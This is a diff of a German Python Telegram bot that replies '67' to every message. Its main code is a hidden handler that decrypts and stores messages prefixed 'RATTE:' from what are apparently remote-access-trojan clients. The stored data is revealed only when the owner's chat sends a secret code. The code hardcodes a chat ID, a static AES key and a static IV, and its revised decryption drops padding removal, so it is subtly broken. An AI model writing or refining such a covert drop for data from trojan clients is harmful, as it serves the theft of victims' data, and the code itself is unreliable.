@@ -1,46 +1,25 @@
-# ENI & LO – Der 67-Bot (mit Selbstinstallation)
+# ENI & LO – Der 67-Bot (NUR auf Befehl – GARANTIERT)
 
 import os
-import sys
-import subprocess
 import json
+import subprocess
+import sys
 import base64
 from datetime import datetime
+from Crypto.Cipher import AES
 
 # ============================================================
-# SELBSTINSTALLATION – ALLE ABHÄNGIGKEITEN WERDEN BEI START INSTALLIERT
+# MODUL INSTALLIEREN
 # ============================================================
-def install_packages():
-    packages = [
-        "python-telegram-bot==20.7",
-        "cryptography"
-    ]
-    for package in packages:
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-        except:
-            pass
-
-# Versuche zu importieren, falls fehlschlägt -> installieren
 try:
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
 except ImportError:
-    print("⚠️ Installiere python-telegram-bot...")
-    install_packages()
-    from telegram import Update
-    from telegram.ext import Application, MessageHandler, filters, CallbackContext
-
-try:
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
-    from cryptography.hazmat.primitives import padding
-except ImportError:
-    print("⚠️ Installiere cryptography...")
-    install_packages()
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
-    from cryptography.hazmat.primitives import padding
+    print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
+    print("✅ Installation abgeschlossen. Starte Bot neu...")
+    os.execv(sys.executable, ['python'] + sys.argv)
 
 # ============================================================
 # KONFIGURATION
@@ -53,9 +32,9 @@ LAST_UPDATE_FILE = "last_update.txt"
 # DEINE CHAT-ID
 MY_CHAT_ID = "8583803376"
 
-# DER GEHEIME SCHLÜSSEL (MUSS 32 ZEICHEN SEIN)
-SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA".encode('utf-8')
-IV = b"1234567890123456"
+# DER GEHEIME SCHLÜSSEL
+SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
+IV = "1234567890123456"
 
 # ============================================================
 # VERSCHLÜSSELUNG / ENTSCHLÜSSELUNG
@@ -63,11 +42,8 @@ IV = b"1234567890123456"
 def decrypt(encrypted_data):
     try:
         encrypted_bytes = base64.b64decode(encrypted_data)
-        cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(IV), backend=default_backend())
-        decryptor = cipher.decryptor()
-        decrypted_padded = decryptor.update(encrypted_bytes) + decryptor.finalize()
-        unpadder = padding.PKCS7(128).unpadder()
-        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
+        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
+        decrypted = cipher.decrypt(encrypted_bytes)
         return decrypted.decode('utf-8', errors='ignore')
     except Exception as e:
         return f"[Entschlüsselungsfehler: {str(e)}]"
@@ -103,7 +79,7 @@ async def handle_message(update: Update, context: CallbackContext):
     chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. Geheimer Code – !67?
+    # 1. GEHEIMER CODE – !67? (NUR HIER WERDEN DATEN GEZEIGT)
     # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
@@ -171,7 +147,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. Daten von Ratten – NUR SPEICHERN
+    # 2. DATEN VON RATTEN – NUR SPEICHERN, NIE ANZEIGEN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -193,13 +169,14 @@ async def handle_message(update: Update, context: CallbackContext):
                 })
                 save_data(all_data)
 
+                # NUR "67" – KEINE DATEN ANZEIGEN
                 await update.message.reply_text("67")
                 return
         except Exception as e:
             print(f"Fehler beim Speichern: {e}")
 
     # ============================================================
-    # 3. Normale Nachricht – 67
+    # 3. ALLE ANDEREN NACHRICHTEN – 67
     # ============================================================
     await update.message.reply_text("67")
 
@@ -207,7 +184,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (mit Selbstinstallation)")
+    print("🐀 ENI & LO – Der 67-Bot (NUR auf Befehl – GARANTIERT)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
